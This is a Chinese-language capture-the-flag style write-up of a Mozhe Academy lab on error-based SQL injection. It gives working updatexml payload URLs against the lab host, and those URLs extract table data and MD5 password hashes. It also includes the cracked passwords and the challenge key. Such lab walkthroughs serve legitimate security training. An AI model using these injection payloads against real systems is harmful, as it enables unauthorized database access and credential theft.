### SQL注入漏洞测试(报错盲注)

[SQL注入漏洞测试(报错盲注)_SQL注入_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)](https://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3Wi81bDh3Ulp0bGhOUT09bW96aGUmozhe)

1. 进入公告界面，id后加单引号，sql语句报错，存在注入点

2. 根据题目报错盲注提示，进行错误构造

   updatexml(xml_doument,XPath_string,new_value):该函数第一个参数是xml文档名，第二个参数是XPath格式的字符串（类似于html的标签，左右两边的符号得相同），第三个参数是新值

   本题中，不用管第一个和第三个参数，注意第二个参数位置要使用concat（）函数左右拼接一个特殊符号（16进制表示）

   ex：http://124.70.71.251:42235/new_list.php?id=1' and updatexml(1,concat(0x7e,(database()),0x7e),1)--+

   注意：必须使用concat函数拼接字符串成为XPath格式，左右少一个符号也会出现回显内容，最好两边都加上

3. 接下来通过database()处的回显用information_schema数据库依次查列名，表名，方式同其他手工注入

4. 查询字段：

   1. http://124.70.71.251:42235/new_list.php?id=1' and updatexml(1,concat(0x7e,(select group_concat(name) from member),0x7e),1)--+

   2. http://124.70.71.251:42235/new_list.php?id=1' and updatexml(1,concat(0x7e,(select group_concat(password) from member),0x7e),1)--+

      注意：1. 即使使用group_concat()也只能查出一个31位的MD5加密字符串，在其后加limit两次查出两个加密后密码

      

      http://124.70.71.251:42235/new_list.php?id=1' and updatexml(1,concat(0x7e,(select password from member limit 0,1),0x7e),1)--+

      XPATH syntax error: '~3114b433dece9180717f2b7de56b28a'

      

      http://124.70.71.251:42235/new_list.php?id=1' and updatexml(1,concat(0x7e,(select password from member limit 1,1),0x7e),1)--+

      XPATH syntax error: '~040a4aaad47c86bbbfdb3da8540e94f'

      

   3. 通过substr()函数截取得到最后一位：

      http://124.70.71.251:42235/new_list.php?id=1' and updatexml(1,concat(0x7e,(select group_concat(substr(password,32,1)) from member),0x7e),1)--+

      XPATH syntax error: '~3,4~'

5. 解密得到两个密码：528469，996952

6. 用第二个密码登录，得到key：mozhe3773716f325f6779063fd1fb497

所以该题最多显示31个字符！

